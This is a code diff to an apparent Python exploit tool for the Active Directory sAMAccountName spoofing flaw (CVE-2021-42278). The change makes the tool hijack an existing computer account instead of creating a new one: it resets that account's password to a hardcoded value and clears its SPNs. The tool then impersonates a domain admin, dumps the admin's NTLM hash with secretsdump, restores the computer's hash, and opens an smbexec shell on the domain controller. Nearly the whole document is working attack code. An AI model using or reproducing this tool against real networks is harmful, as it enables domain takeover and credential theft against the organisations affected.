@@ -18,17 +18,17 @@ from binascii import unhexlify
 import ldapdomaindump
 import ldap3
 import time
+import re
 
 from utils.helper import *
 from utils.addcomputer import AddComputerSAMR
 from utils.S4U2self import GETST
+from utils import smbresetpasswd
 
 characters = list(string.ascii_letters + string.digits + "!@#$%^&*()")
 
 
 def samtheadmin(username, password, domain, options):
-    new_computer_name = f"SAMTHEADMIN-{random.randint(1,100)}$" 
-    new_computer_password = ''.join(random.choice(characters) for _ in range(12))
 
     domain, username, password, lmhash, nthash = parse_identity(options)
     ldap_server, ldap_session = init_ldap_session(options, domain, username, password, lmhash, nthash)
@@ -36,9 +36,8 @@ def samtheadmin(username, password, domain, options):
     cnf = ldapdomaindump.domainDumpConfig()
     cnf.basepath = None
     domain_dumper = ldapdomaindump.domainDumper(ldap_server, ldap_session, cnf)
-    MachineAccountQuota = 10
-    for i in domain_dumper.getDomainPolicy():
-        MachineAccountQuota = int(str(i['ms-DS-MachineAccountQuota']))
+    
+    
     rootsid = domain_dumper.getRootSid()
     dcinfo = get_dc_host(ldap_session, domain_dumper)
     if not len(dcinfo['name']):
@@ -46,33 +45,54 @@ def samtheadmin(username, password, domain, options):
         exit()
     dc_host = dcinfo['name'][0].lower()
     dcfull = dcinfo['dNSHostName'][0].lower()
+
     logging.info(f'Selected Target {dcfull}')
     domainAdmins = get_domain_admins(ldap_session, domain_dumper)
     random_domain_admin = random.choice(domainAdmins)
     logging.info(f'Total Domain Admins {len(domainAdmins)}')
     logging.info(f'will try to impersonat {random_domain_admin}')
 
-    # udata = get_user_info(username, ldap_session, domain_dumper)
-    if MachineAccountQuota < 0:
-        logging.critical(f'Cannot exploit , ms-DS-MachineAccountQuota {MachineAccountQuota}')
-        exit()
-    else:
+    # MachineAccountQuota
+    for i in domain_dumper.getDomainPolicy():
+        MachineAccountQuota = int(str(i['ms-DS-MachineAccountQuota']))
+    if MachineAccountQuota < 0 or MachineAccountQuota == 0:
         logging.info(f'Current ms-DS-MachineAccountQuota = {MachineAccountQuota}')
 
-    logging.info(f'Adding Computer Account "{new_computer_name}"')
-    logging.info(f'MachineAccount "{new_computer_name}" password = {new_computer_password}')
 
+    # Choosing a computer
+    dn = get_user_info(username, ldap_session, domain_dumper)
+    if dn:
+        objectSid = str(dn['attributes']['objectSid'][0])
+        logging.info(f'Current user {username}\'s objectSid is {objectSid}' )
+    else:
+        logging.error(f'Cannot find current user {username}')
+    
+    computers = get_computers(objectSid, ldap_session, domain_dumper)
+    logging.info(f'User {username}\'s domain computers : {computers}')
+    random_domain_computer = random.choice(computers)
+    new_computer_name = random_domain_computer
+    new_computer_name_full = new_computer_name.split('$')[0] + '.' + domain 
+    new_computer_password = 'P@ssw0rd4321'
+    logging.info(f'will try to exploit through {random_domain_computer}')
 
-    # Creating Machine Account
-    addmachineaccount = AddComputerSAMR(
-        username, 
-        password, 
-        domain, 
-        options,
-        computer_name=new_computer_name,
-        computer_pass=new_computer_password)
-    addmachineaccount.run()
+    # reset the pass
+    logging.info(f'Reseting the password of {new_computer_name} into P@ssw0rd4321...')
+    resetpasswd = smbresetpasswd.SamrResetPassword(username=username, password=password, dc_ip=options.dc_ip)
+    resetpasswd.reset_password(user=new_computer_name, newpassword=new_computer_password)
+    logging.info(f'Successfully reset {new_computer_name}\'s password')
 
+    # clear spn
+    spns = get_spn(new_computer_name, ldap_session, domain_dumper)['attributes']['servicePrincipalName']
+    logging.info(f'{new_computer_name}\'s spn found:')
+    for spn in spns:
+        print(f'        {spn}')
+    logging.info("Clearing the spns...")
+    clear_spn(new_computer_name, ldap_session, domain_dumper)
+    logging.info('Successfully clear the spns')
+    # spns = get_spn(new_computer_name, ldap_session, domain_dumper)['attributes']['servicePrincipalName']
+    # logging.info(f'{new_computer_name}\'s spn found:')
+    # for spn in spns:
+    #     print(f'        {spn}')
 
     # CVE-2021-42278
     new_machine_dn = None
@@ -96,6 +116,7 @@ def samtheadmin(username, password, domain, options):
     dcticket = str(dc_host + '.ccache')
 
 
+
     # Restoring Old Values
     logging.info(f"Resting the machine account to {new_computer_name}")
     dn = get_user_info(dc_host, ldap_session, domain_dumper)
@@ -105,6 +126,12 @@ def samtheadmin(username, password, domain, options):
     else:
         logging.error('Cannot restore the old name lol')
 
+
+
+    # recover spn
+    logging.info("Recovering the spns...")
+    add_spn(new_computer_name, spns, ldap_session, domain_dumper)
+    logging.info('Successfully recover the spns')
 
 
     os.environ["KRB5CCNAME"] = dcticket
@@ -117,12 +144,35 @@ def samtheadmin(username, password, domain, options):
     adminticket = str(random_domain_admin + '.ccache')
     os.environ["KRB5CCNAME"] = adminticket
 
-    # will do something else later on 
-    fbinary = "python3 /Users/huxuhao/impacket/examples/smbexec.py"
-    if options.dump:
-        fbinary = "python3 /Users/huxuhao/impacket/examples/smbexec.py"
+    # get Domain Admin hash
+    fbinary = "python3 utils/secretsdump.py"
+    getashell = f"KRB5CCNAME='{adminticket}' {fbinary} -target-ip {options.dc_ip} -dc-ip {options.dc_ip} -k -no-pass -just-dc-user '{random_domain_admin}' @'{dcfull}'"
+    ntlm_hash = re.findall(r'[a-fA-F\d]{32}:[a-fA-F\d]{32}', re.findall(r'\:?(.*?)\:\:\:', os.popen(getashell).read())[0])[0]
+    logging.info(f"Getting the {random_domain_admin}\'s ntlm hash: {ntlm_hash}")
+    logging.info(f"Trying to recover the ntlm for {new_computer_name}")
+    input_text = str(input(f"Pls input the IP of {new_computer_name}："))
+    new_computer_name_ip = re.findall(r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b', input_text)[0]
+    recoverthehash = f"{fbinary} -target-ip {new_computer_name_ip} -hashes '{ntlm_hash}' '{domain}/{random_domain_admin}'@'{new_computer_name_full}'"
+    try:
+        logging.info(f"Getting the {new_computer_name}\'s hash ... ")
+        logging.info("May take a few seconds ... Wait...")
+        ntlm_new_computer_name = re.findall(r'[a-fA-F\d]{32}:[a-fA-F\d]{32}', re.findall(r'\:?(.*?)\:\:\:', os.popen(recoverthehash).read())[-1])[0]
+        logging.info(f"Getting the {new_computer_name}\'s ntlm hash: {ntlm_new_computer_name}")
+        logging.info(f"Recovering the ntlm for {new_computer_name}")
+        resetpasswd = smbresetpasswd.SamrResetPassword(username=username, password=password, dc_ip=options.dc_ip)
+        resetpasswd.reset_password(user=new_computer_name, newhashes=ntlm_new_computer_name)
+        logging.info(f'Successfully reset {new_computer_name}\'s password')
+    except:
+        logging.error(f"Something seems wrong AND YOU SHOULD RECOVER THE NTLM FOR {new_computer_name} by YOURSELF!!")
+        
+    
 
-    print(adminticket+fbinary+options.dc_ip+options.dc_ip+dcfull)
+
+    # will do something else later on 
+    fbinary = "python3 utils/smbexec.py"
+    if options.dump:
+        fbinary = "python3 utils/secretsdump.py"
+
     getashell = f"KRB5CCNAME='{adminticket}' {fbinary} -target-ip {options.dc_ip} -dc-ip {options.dc_ip} -k -no-pass @'{dcfull}'                                                                    "
     os.system(getashell)
 
